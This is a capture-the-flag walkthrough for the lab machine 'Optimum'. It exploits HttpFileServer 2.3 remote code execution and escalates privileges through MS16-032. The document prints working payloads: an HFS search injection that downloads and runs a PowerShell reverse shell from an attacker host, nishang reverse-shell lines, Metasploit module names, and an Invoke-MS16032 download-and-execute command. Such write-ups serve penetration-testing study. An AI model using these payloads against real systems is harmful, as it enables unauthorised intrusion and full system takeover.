## Optimum

Difficulty: Easy

### User Flag

Rustscan return to us that port 80 is open.

```
rustscan -a 10.10.10.8 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![nmap](https://github.com/b1d0ws/OSCP/assets/58514930/e328c8ab-21c6-456a-8656-16d916c6632d)

<br>

Looking in the website, we see that HttpFileServer 2.3 is being used.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/24475f35-a321-41d1-b75f-85bd820fc25f)

<br>

Searching vulnerabilities, there is a RCE exploit available.

![searchsploit](https://github.com/b1d0ws/OSCP/assets/58514930/176e3907-6dd7-4bc0-992f-6ee7b49077ee)

<br>

We can use [this one](https://www.exploit-db.com/exploits/49584) which automatically retrieves a shell for us.  

Remember to edit the exploit for your desired configurations.

![firstRevShell](https://github.com/b1d0ws/OSCP/assets/58514930/88d28c85-4a8b-4476-9bb4-f09358d0181a)

<br>

If we can to exploit this manually, get the search request of HFS and use the payload above to execute Invoe-PowerShellTcp from nishang.  

Remember to add a line invoking the script on the end of it.

```
# Add this to the end of Invoke-PowerShellTcp.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 1337

# Payload
%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1').}
```

![manualRevShell](https://github.com/b1d0ws/OSCP/assets/58514930/a2905f7a-8c02-4925-81d1-cac9ea3dfb1c)

<br>

### Root Flag

Enumerating the operational system, this OS Version is vulnerable to privilege escalation.

![enumeratingOS](https://github.com/b1d0ws/OSCP/assets/58514930/635d3c9b-4067-4437-a765-2fc4eaf44b67)

![searchingPrivEsc](https://github.com/b1d0ws/OSCP/assets/58514930/d59366af-44e0-467b-93d5-053489e241a6)

<br>

#### Explotiing with Metasploit

```
# Get a meterpreter session
exploit/windows/http/rejetto_hfs_exec

# Use this module to priv esc
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

![privEscMetasploit](https://github.com/b1d0ws/OSCP/assets/58514930/1b294223-df66-4fd2-97c6-dd87f1308a21)

<br>

#### Manually

```
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1

# Add this to the end of the payload
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.14.21:8000/shell.ps1')"

cp Invoke-PowerShellTcp.ps1 shell.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.21 -Port 1338

IEX(New-Object Net.WebClient).downloadString('http://10.10.14.21:8000/Invoke-MS16032.ps1')
```

![scripts](https://github.com/b1d0ws/OSCP/assets/58514930/44b957bd-91f9-4b6d-8613-6360aaaf44d8)

![privilegeEscalation](https://github.com/b1d0ws/OSCP/assets/58514930/f99bdede-64da-4432-a107-e41c7a4dd21c)
